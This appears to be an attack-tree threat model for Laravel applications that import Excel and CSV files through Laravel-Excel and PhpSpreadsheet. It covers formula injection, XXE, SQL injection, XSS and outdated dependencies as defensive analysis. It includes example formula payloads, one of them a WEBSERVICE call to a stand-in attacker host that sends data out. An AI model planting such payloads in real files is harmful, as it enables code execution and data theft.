## Attack Tree Path: [Exploit File Parsing Vulnerabilities [HIGH RISK PATH]](./attack_tree_paths/exploit_file_parsing_vulnerabilities__high_risk_path_.md)

*   **Attack Vector:** Attackers target weaknesses in how Laravel-Excel (and underlying PhpSpreadsheet) parses Excel and CSV files.
*   **Critical Node: Malicious File Upload:**
    *   **Vulnerability:** Application allows users to upload Excel or CSV files. This is the primary entry point for file-based attacks.
    *   **Impact:**  Allows attackers to introduce malicious files for parsing, potentially triggering vulnerabilities.
*   **High Risk Path: Exploit known parser vulnerabilities (PhpSpreadsheet):**
    *   **Vulnerability:** PhpSpreadsheet, being a complex parser, may contain known vulnerabilities (e.g., Formula Injection, XXE in older versions, memory corruption).
    *   **Critical Node: Identify vulnerable PhpSpreadsheet version:**
        *   **Vulnerability:** Using outdated Laravel-Excel or PhpSpreadsheet versions.
        *   **Impact:** Exposes the application to publicly known and potentially easily exploitable vulnerabilities.
    *   **High Risk Path: Craft file to trigger known vulnerability (e.g., formula injection, XXE):**
        *   **Vulnerability:** Specific vulnerabilities within PhpSpreadsheet parsing logic.
        *   **Impact:** Remote Code Execution (RCE), Data Exfiltration, Denial of Service (DoS) depending on the vulnerability exploited.
*   **High Risk Path: Formula Injection (if application uses user-controlled formulas):**
    *   **Critical Node: Application allows user-defined formulas in Excel import:**
        *   **Vulnerability:** Application design choice to allow formula evaluation from user-uploaded files.
        *   **Impact:** Introduces the risk of formula injection if not properly handled.
    *   **High Risk Path: Inject malicious formulas (e.g., `=SYSTEM("malicious_command")`, `=WEBSERVICE("http://attacker.com/data")`):**
        *   **Vulnerability:**  PhpSpreadsheet's formula evaluation capabilities, combined with lack of sanitization in the application.
        *   **Impact:** Remote Code Execution (RCE) via functions like `SYSTEM`, Data Exfiltration via functions like `WEBSERVICE` (if available and not restricted).

## Attack Tree Path: [Exploit Data Processing Vulnerabilities (Post-Parsing) [HIGH RISK PATH]](./attack_tree_paths/exploit_data_processing_vulnerabilities__post-parsing___high_risk_path_.md)

*   **Attack Vector:** Attackers exploit vulnerabilities in how the application processes the data *after* Laravel-Excel has parsed it.
*   **High Risk Path: Data Injection into Database/Application Logic:**
    *   **High Risk Path: Parsed data is directly used in SQL queries without sanitization:**
        *   **Critical Node: Parsed data is directly used in SQL queries without sanitization:**
            *   **Vulnerability:** Failure to use parameterized queries or prepared statements when incorporating data from Excel/CSV into SQL queries.
            *   **Impact:** SQL Injection - allowing attackers to manipulate database queries, potentially leading to data breaches, data modification, or even RCE depending on database privileges.
        *   **High Risk Path: Inject SQL injection payloads within Excel/CSV data:**
            *   **Vulnerability:** Application's susceptibility to SQL Injection via data originating from Excel/CSV files.
            *   **Impact:** SQL Injection - same impacts as above.
*   **High Risk Path: Cross-Site Scripting (XSS) via Parsed Data (if application displays parsed data):**
    *   **High Risk Path: Parsed data is displayed to users without proper output encoding:**
        *   **Critical Node: Parsed data is displayed to users without proper output encoding:**
            *   **Vulnerability:** Failure to properly encode data extracted from Excel/CSV files before displaying it in HTML.
            *   **Impact:** Cross-Site Scripting (XSS) - allowing attackers to inject malicious scripts that execute in users' browsers, potentially leading to session hijacking, defacement, or client-side attacks.
        *   **High Risk Path: Inject XSS payloads within Excel/CSV data:**
            *   **Vulnerability:** Application's susceptibility to XSS due to displaying unsanitized data from Excel/CSV files.
            *   **Impact:** Cross-Site Scripting (XSS) - same impacts as above.

## Attack Tree Path: [Exploit Configuration or Dependency Issues [HIGH RISK PATH]](./attack_tree_paths/exploit_configuration_or_dependency_issues__high_risk_path_.md)

*   **Attack Vector:** Attackers exploit vulnerabilities arising from misconfigurations or outdated dependencies.
*   **High Risk Path: Vulnerable PhpSpreadsheet Dependency:**
    *   **Critical Node: Vulnerable PhpSpreadsheet Dependency:**
        *   **Vulnerability:** Using an outdated version of PhpSpreadsheet that contains known security vulnerabilities.
        *   **Impact:** Inherits all vulnerabilities present in the outdated PhpSpreadsheet version, potentially including RCE, Data Exfiltration, or DoS.
    *   **High Risk Path: Application uses outdated Laravel-Excel version with vulnerable PhpSpreadsheet:**
        *   **Vulnerability:** Using an outdated Laravel-Excel version that bundles or depends on a vulnerable PhpSpreadsheet version.
        *   **Impact:**  Indirectly exposes the application to PhpSpreadsheet vulnerabilities.
    *   **High Risk Path: Exploit known vulnerabilities in the used PhpSpreadsheet version:**
        *   **Vulnerability:** Publicly known vulnerabilities (CVEs) in the specific PhpSpreadsheet version being used.
        *   **Impact:** Exploitation of these known vulnerabilities, potentially leading to RCE, Data Exfiltration, or DoS.
